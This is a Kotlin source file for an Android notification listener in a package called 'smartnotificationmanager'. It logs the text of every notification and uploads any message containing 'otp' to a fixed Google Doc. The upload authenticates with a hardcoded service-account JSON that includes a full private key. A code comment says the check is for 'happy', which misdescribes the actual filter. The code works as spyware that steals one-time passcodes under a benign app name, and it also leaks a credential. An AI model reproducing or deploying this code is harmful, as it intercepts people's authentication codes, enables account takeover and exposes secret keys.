package com.example.smartnotificationmanager

import android.app.Notification
import android.content.ContentValues.TAG
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.google.api.client.http.HttpTransport
import com.google.api.client.http.javanet.NetHttpTransport
import com.google.api.client.json.JsonFactory
import com.google.api.client.json.gson.GsonFactory
import com.google.api.services.docs.v1.Docs
import com.google.api.services.docs.v1.DocsScopes
import com.google.api.services.docs.v1.model.BatchUpdateDocumentRequest
import com.google.api.services.docs.v1.model.InsertTextRequest
import com.google.api.services.docs.v1.model.Location
import com.google.api.services.docs.v1.model.Request
import com.google.auth.http.HttpCredentialsAdapter
import com.google.auth.oauth2.GoogleCredentials
import kotlinx.coroutines.DelicateCoroutinesApi

class MyNotificationListenerService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        // Check if the notification is a text message and contains "happy"
        val notification = sbn.notification
        val extras = notification.extras
        val message = extras.getCharSequence(Notification.EXTRA_TEXT).toString()

        Log.d(TAG, "Notification posted from package: ${sbn.packageName} at ${sbn.postTime} with message: $message")

        if (message.contains("otp", ignoreCase = true)) {
            Log.d(TAG, "OTP message detected, preparing to upload")
            uploadToGoogleDocs(message)
        }
    }

    @OptIn(DelicateCoroutinesApi::class)
    private fun uploadToGoogleDocs(message: String) {
        Log.d("After PK", "Working")

        GlobalScope.launch(Dispatchers.IO) {
            val jsonCred = """
        {
          "type": "service_account",
          "project_id": "temporal-tensor-423916-t1",
          "private_key_id": "833435230882111d953f01b2c0dca2d44ce54dba",
          "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCdBKw3AcyK85Dg\nDv35+scGaFUo/cR+ZudK6OFC1vwB91NUkZUMnhPUTN2vsPdJeRBtG8xpMWOIz31W\nzoYuVbULBdEwsYlRGx5a75SUe7UON0cPDfIL85NNCNYp7CqQQHPbo8PytJIQysmC\nK+56Qh1kjcVwQG63n5rp77GXc2rEOzwwi2qgvnvv1IGf08ERbU60wZGC4aksJw2U\nOGmFUNFQ5ve/sPRQdgwRzvYCvNRsNUcacaLdMLaS5qjs4H30PlUmHbe6oj0DClh4\n4nUGi3Fh2o5O/6jFQjrkE4BF4KHR7+QQ8ccmayj73iAS3Cjh1stC4cmnk6/l9xmU\nPHedb3k7AgMBAAECggEAAN4HvX4LDTFvOW2bxYe3Fbf50HImZbRXzrgelmntlm0x\nTqRHOHyfC2spRlEp7IP4rUGcDXCyZg0PWi1l3Feo2li74RL5+TK3JjVwkqlkRKHV\niKXBEoPT6ncEB9NAIO/aM/phmLOaovEbz9ZCSPaYhvepgYc5lVYSWvxx9K40hsTy\nxZB3/gw+YiqWrCcrbn4rUZkmZZZf+HnWovF2BpaA50q/kU6bE0YcRkBUuGqGd7LW\nHmAL60/S4g4hgvr4N8FOTU7vO60UXxbZCZNjTXv/xonuB3V8bfj7ErRTfXANKYaC\nBMJI3S4pZIVyQTBLbZ8YO4I+2RpsiZjZygyWVpN0AQKBgQDYDhG2HgSvmFZOOzEL\nFKQzsKU5gfzf01w4t0tCvHATqhCPcV+MH8IknC1iXqBTCbKM7Lwp0mIdoYtc7DyP\nKTtY2ZSimMb5FC0onhKC2FrZyHLEg2Cnlry9vRfczFCew2tsJ1pCkJ87BXN26FTO\njUJO/Do4CiGQL7XnCUgEUMpKOwKBgQC6DGH5cwA2IQ9Jf57C9JToQ2z3TiNUxGtI\nScNzIDG4I4xAqiEMV3dn6S5Td2KZRU0cU8emwXEckHZ55ANDJHQYJuM4Dz+m0bbo\n1kS3kxp8WI2TEUSQald9X/uASGJT+YkIsjebl+Zls1kjxE5Xj50TL6/Nepn67G7k\nHchUxm2dAQKBgQC2LMbKZO1WkoDTXh2wVitOWng20WBD6pgsSoFvOCzYp+Fm0hXa\ntTyiWf36oAdXfSnMoiDWssqAaaJ1K8y0efPMq0ok/+VmSJj7Uq4RHhUc5WPAR3bM\nWNG0uyjPyIeCFw0RGO2GiyN4RNRjQuufboSmzQ7aCdDbHx+mO7E50lV/2QKBgQCz\nIgsPgD/a3lf2v48gTRg2zfzT3QM9seVN89/hMEVO88Mt2+D4HhtVDHpTWSaxRr2p\nIa2hDK4Y/6tjTzwo4Kd7Pa4XIu95coC3jN8bFeMxiJ2/1ad7mThl+g2RBaDPE/ty\nSQ4rnMT0dQvF2VRJEHj/qTGPGZW6uP1IXLivj2KpAQKBgFjAQBfb/zPwp9kdtS2A\nm2z8o34C6l3XyIOwyQzNYzh9mLC5MBjaFa2KI66s5UGA6ZW4vkNCFqur3gslyGz/\nXTLseky4cAZP9uGwybjJtYLy4+ZYG86iOjRvvSvGwEUB+IdyqkXoDg5tOCHQuFm+\nMUAfIQWuXK3xYA4U4sNvHIlk\n-----END PRIVATE KEY-----\n",
          "client_email": "test2-116@temporal-tensor-423916-t1.iam.gserviceaccount.com",
          "client_id": "106674495217515513337",
          "auth_uri": "https://accounts.google.com/o/oauth2/auth",
          "token_uri": "https://oauth2.googleapis.com/token",
          "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
          "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/test2-116%40temporal-tensor-423916-t1.iam.gserviceaccount.com",
          "universe_domain": "googleapis.com"
        }
    """.trimIndent()


            val googleCredentials = GoogleCredentials.fromStream(jsonCred.byteInputStream())
                .createScoped(listOf(DocsScopes.DOCUMENTS))

            val httpTransport: HttpTransport = NetHttpTransport()
            val jsonFactory: JsonFactory = GsonFactory()

            val requestInitializer = HttpCredentialsAdapter(googleCredentials)

            val service = Docs.Builder(httpTransport, jsonFactory, null)
                .setHttpRequestInitializer(requestInitializer)
                .setApplicationName("ProjectMessages")
                .build()

            val documentId = "1dp_wioS-2bcPh5dAqXIItB6tv8-2SqbdFuRrinbFRKo"
            val document = service.documents().get(documentId).execute()

            // Determine the insertion index
            val content = document.body?.content
            val lastIndex = content?.lastOrNull()?.endIndex ?: 1
            val insertionIndex = lastIndex - 1

            // Format the message with a timestamp
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val formattedMessage = "\n$message\tReceived at: $timestamp"

            // Create a request to insert the formatted message
            val requests = listOf(
                Request().setInsertText(
                    InsertTextRequest()
                        .setText(formattedMessage)
                        .setLocation(Location().setIndex(insertionIndex))
                )
            )

            // Try to update the Google Docs document
            try {
                service.documents()
                    .batchUpdate(documentId, BatchUpdateDocumentRequest().setRequests(requests))
                    .execute()
            } catch (e: Exception) {
                Log.e("GoogleDocsError", "Failed to update document: ${e.message}")
            }
        }
    }

}